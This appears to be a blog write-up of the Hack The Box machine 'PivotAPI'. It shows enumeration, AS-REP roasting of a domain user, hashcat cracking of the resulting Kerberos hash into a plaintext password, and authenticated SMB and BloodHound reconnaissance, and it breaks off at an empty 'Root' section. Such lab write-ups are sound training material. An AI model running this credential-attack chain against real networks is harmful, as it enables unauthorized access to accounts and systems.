---
title: "[HTB] Machine: PivotAPI"
description: "[HTB] Machine: PivotAPI"
date: 2023-10-04
menu:
  sidebar:
    name: "[HTB] Machine: PivotAPI"
    identifier: htb-machine-PivotAPI
    parent: htb-machines-windows
    weight: 10
hero: images/pivotapi.png
tags: ["HTB"]
---

# PivotAPI
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.240 --min-rate 5000                                                                              
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:10 BST
Nmap scan report for 10.10.10.240 (10.10.10.240)
Host is up (0.10s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49708/tcp open  unknown
52843/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 65.93 seconds

```
```
└─$ nmap -Pn -p21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389 -sC -sV 10.10.10.240 --min-rate 5000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:12 BST
Nmap scan report for 10.10.10.240 (10.10.10.240)
Host is up (0.10s latency).

PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
| 02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
| 02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
| 02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
| 08-08-20  01:18PM               219091 notes1.pdf
| 08-08-20  01:34PM               279445 notes2.pdf
| 08-08-20  01:41PM                  105 README.txt
|_02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
22/tcp   open     ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   3072 fa:19:bb:8d:b6:b6:fb:97:7e:17:80:f5:df:fd:7f:d2 (RSA)
|   256 44:d0:8b:cc:0a:4e:cd:2b:de:e8:3a:6e:ae:65:dc:10 (ECDSA)
|_  256 93:bd:b6:e2:36:ce:72:45:6c:1d:46:60:dd:08:6a:44 (ED25519)
53/tcp   open     domain        Simple DNS Plus
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-05 19:12:42Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  filtered ldap
445/tcp  open     microsoft-ds?
464/tcp  filtered kpasswd5
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     tcpwrapped
1433/tcp open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.240:1433: 
|     Target_Name: LICORDEBELLOTA
|     NetBIOS_Domain_Name: LICORDEBELLOTA
|     NetBIOS_Computer_Name: PIVOTAPI
|     DNS_Domain_Name: LicorDeBellota.htb
|     DNS_Computer_Name: PivotAPI.LicorDeBellota.htb
|     DNS_Tree_Name: LicorDeBellota.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.10.240:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-10-05T19:05:41
|_Not valid after:  2053-10-05T19:05:41
|_ssl-date: 2023-10-05T19:13:30+00:00; -7h00m01s from scanner time.
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
3269/tcp open     tcpwrapped
9389/tcp open     mc-nmf        .NET Message Framing
Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-10-05T19:12:54
|_  start_date: N/A
|_clock-skew: mean: -7h00m01s, deviation: 0s, median: -7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.10 seconds

```

- `smb`
```
└─$ smbclient -N -L //10.10.10.240                                                              
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.240 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
- `dns`
```
└─$ dig axfr LicorDeBellota.htb @PivotAPI.LicorDeBellota.htb                                                   

; <<>> DiG 9.19.17-1-Debian <<>> axfr LicorDeBellota.htb @PivotAPI.LicorDeBellota.htb
;; global options: +cmd
; Transfer failed.

```

- `ldapsearch`
```
└─$ ldapsearch -H ldap://LicorDeBellota.htb -x -s base namingcontexts           
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=LicorDeBellota,DC=htb
namingcontexts: CN=Configuration,DC=LicorDeBellota,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=LicorDeBellota,DC=htb
namingcontexts: DC=DomainDnsZones,DC=LicorDeBellota,DC=htb
namingcontexts: DC=ForestDnsZones,DC=LicorDeBellota,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```
```
└─$ ldapsearch -H ldap://LicorDeBellota.htb -x -b "DC=LicorDeBellota,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=LicorDeBellota,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

- No results for `rpc`
- `ftp`
```
└─$ ftp anonymous@10.10.10.240
Connected to 10.10.10.240.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||57367|)
150 Opening ASCII mode data connection.
02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
08-08-20  01:18PM               219091 notes1.pdf
08-08-20  01:34PM               279445 notes2.pdf
08-08-20  01:41PM                  105 README.txt
02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
226 Transfer complete.

```

- Running `exiftool` on `pdf` files shows `LicorDeBellota.htb\kaorz`
```
======== notes2.pdf
ExifTool Version Number         : 12.67
File Name                       : notes2.pdf
Directory                       : .
File Size                       : 279 kB
File Modification Date/Time     : 2020:08:08 12:34:25+01:00
File Access Date/Time           : 2023:10:06 19:12:03+01:00
File Inode Change Date/Time     : 2023:10:06 19:12:03+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 5
XMP Toolkit                     : Image::ExifTool 12.03
Creator                         : Kaorz
Publisher                       : LicorDeBellota.htb
Producer                        : cairo 1.10.2 (http://cairographics.org)
```
## Foothold
- Let's check if user is `AS-REP`-roastable
```
└─$ impacket-GetNPUsers -dc-ip PivotAPI.LicorDeBellota.htb LicorDeBellota.htb/kaorz -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for kaorz
$krb5asrep$23$kaorz@LICORDEBELLOTA.HTB:117660010b88116ef19ce2f9e608d1d9$a8f47a80fddd556b91bb360af849916358388168cf2ed0c2783c95ff09d799d504477fefe0d1a9ab33a92243939260e558b739cedd2a8c3d61bf85ae56360069cd38a4f14b04865afdbbbf99a3816da14b41058a0249c62c180d50337a6e3c27da5cdde876ca8b4f70f1d5624c1f3358e0a451bb5ec9cb3ee580148951680f5d06f2ce8c11bf61cb8600cbb290dd046a12ad9c8cae68e4ca9706c904189e4ef0a192f8cc192e6286241547ae151111d074323e54a174b945156365f6db2f80d9b7ec558ffa64b7fcd93206f055ecfbf973fa4fff67f20ea88d63fdc29d6aea709c7da2d8073ef9f7fcc3f36a39160138e0679042f7fd8441
```

- Let's crack it
  - `kaorz:Roper4155`
```
└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1435/2934 MB (512 MB allocatable), 2MCU
...
$krb5asrep$23$kaorz@LICORDEBELLOTA.HTB:117660010b88116ef19ce2f9e608d1d9$a8f47a80fddd556b91bb360af849916358388168cf2ed0c2783c95ff09d799d504477fefe0d1a9ab33a92243939260e558b739cedd2a8c3d61bf85ae56360069cd38a4f14b04865afdbbbf99a3816da14b41058a0249c62c180d50337a6e3c27da5cdde876ca8b4f70f1d5624c1f3358e0a451bb5ec9cb3ee580148951680f5d06f2ce8c11bf61cb8600cbb290dd046a12ad9c8cae68e4ca9706c904189e4ef0a192f8cc192e6286241547ae151111d074323e54a174b945156365f6db2f80d9b7ec558ffa64b7fcd93206f055ecfbf973fa4fff67f20ea88d63fdc29d6aea709c7da2d8073ef9f7fcc3f36a39160138e0679042f7fd8441:Roper4155
```
- The creds didn't work for `ssh`
```
└─$ sshpass -p 'Roper4155' ssh kaorz@10.10.10.240
Warning: Permanently added '10.10.10.240' (ED25519) to the list of known hosts.
Permission denied, please try again.
```

- No `SPN`s
```
└─$ impacket-GetUserSPNs LicorDeBellota.htb/Kaorz:'Roper4155' -dc-ip 10.10.10.240  
Impacket v0.11.0 - Copyright 2023 Fortra

No entries found!
```
- No access to `mysql`
```
└─$ impacket-mssqlclient LicorDeBellota.htb/Kaorz:'Roper4155'@10.10.10.240 -windows-auth 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario 'LICORDEBELLOTA\Kaorz'.
                                                                                                             
```
## User
- Let's check `bloodhound`
```
└─$ bloodhound-python -u kaorz -p 'Roper4155' -d licordebellota.htb -dc licordebellota.htb -ns 10.10.10.240 --zip
INFO: Found AD domain: licordebellota.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: licordebellota.htb
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 28 users
INFO: Connecting to LDAP server: licordebellota.htb
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 58 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: PivotAPI.LicorDeBellota.htb
INFO: Done in 00M 16S
INFO: Compressing output into 20231007112624_bloodhound.zip
```

- Nothing interesting
  - `Domain Users`

![](./images/1.png)

- I'll check `smb`
```
└─$ smbclient -L //10.10.10.240/ -U 'kaorz%Roper4155'                                        

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.240 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- We have files in `Netlogon\HelpDesk`
```
└─$ smbclient //10.10.10.240/NETLOGON -U 'kaorz%Roper4155'           
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug  8 11:42:28 2020
  ..                                  D        0  Sat Aug  8 11:42:28 2020
  HelpDesk                            D        0  Sun Aug  9 16:40:36 2020

                5158399 blocks of size 4096. 1053109 blocks available
smb: \> cd HelpDesk\
smb: \HelpDesk\> ls
  .                                   D        0  Sun Aug  9 16:40:36 2020
  ..                                  D        0  Sun Aug  9 16:40:36 2020
  Restart-OracleService.exe           A  1854976  Fri Feb 19 10:52:01 2021
  Server MSSQL.msg                    A    24576  Sun Aug  9 12:04:14 2020
  WinRM Service.msg                   A    26112  Sun Aug  9 12:42:20 2020

                5158399 blocks of size 4096. 1053109 blocks available

```
- Download the files
  - We see `msg` files, which are `Outlook` message files
  - We need to install `msgconvert` via `sudo apt-get install libemail-outlook-message-perl`
    - https://www.matijs.net/software/msgconv

```
└─$ file *.msg            
Server MSSQL.msg:  CDFV2 Microsoft Outlook Message
WinRM Service.msg: CDFV2 Microsoft Outlook Message
```

- Run `msgconvert`
  - Now we have `eml` files, which we can read
```
└─$ msgconvert *.msg
```
```
Date: Sun, 09 Aug 2020 11:04:14 +0000
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary=16967873760.dB4b.277836
Content-Transfer-Encoding: 7bit
Subject: Server MSSQL
To: cybervaca@licordebellota.htb <cybervaca@licordebellota.htb>
...
Good afternoon,
 
Due to the problems caused by the Oracle database installed in 2010 in Windows, it has been decided to migrate to MSSQL at the beginning of 2020.
Remember that there were problems at the time of restarting the Oracle service and for this reason a program called "Reset-Service.exe" was created to log in to Oracle and restart the service.
 
Any doubt do not hesitate to contact us.
 
Greetings,
 
The HelpDesk Team

```
```
Date: Sun, 09 Aug 2020 11:42:20 +0000
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary=16967873761.1De4bB9e.277836
Content-Transfer-Encoding: 7bit
Subject: WinRM Service
To: helpdesk@licordebellota.htb <helpdesk@licordebellota.htb>
...
Good afternoon.
 
After the last pentest, we have decided to stop externally displaying WinRM's service. Several of our employees are the creators of Evil-WinRM so we do not want to expose this service... We have created a rule to block the exposure of the service and we have also blocked the TCP, UDP and even ICMP output (So that no shells of the type icmp are used.)
Greetings,
 
The HelpDesk Team
```

- We have a `Restart-OracleService.exe` binary mentioned in the mail
  - We probably have to reverse it
```
└─$ file Restart-OracleService.exe 
Restart-OracleService.exe: PE32+ executable (console) x86-64, for MS Windows, 6 sections
```

## Root